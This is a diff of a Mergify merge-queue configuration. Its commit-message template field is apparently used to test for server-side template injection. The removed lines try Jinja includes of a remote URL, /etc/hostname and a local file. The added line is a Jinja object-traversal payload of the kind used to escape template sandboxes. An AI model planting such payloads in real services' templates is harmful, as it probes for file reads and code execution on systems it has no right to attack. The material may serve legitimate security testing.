@@ -6,9 +6,7 @@ queue_rules:
     merge_conditions: []
     merge_method: merge
     commit_message_template: |
-      V6
-      INCLUDE_URL={% include "https://example.com/mergify-ssti-test" %}
-      INCLUDE_FILE={% include "/etc/hostname" %}
-      INCLUDE_REL={% include "test.txt" %}
+      V7
+      TEST={{ [lipsum]|selectattr("__class__")|first|attr(title or "fromkeys") }}
 merge_queue:
   max_parallel_checks: 1
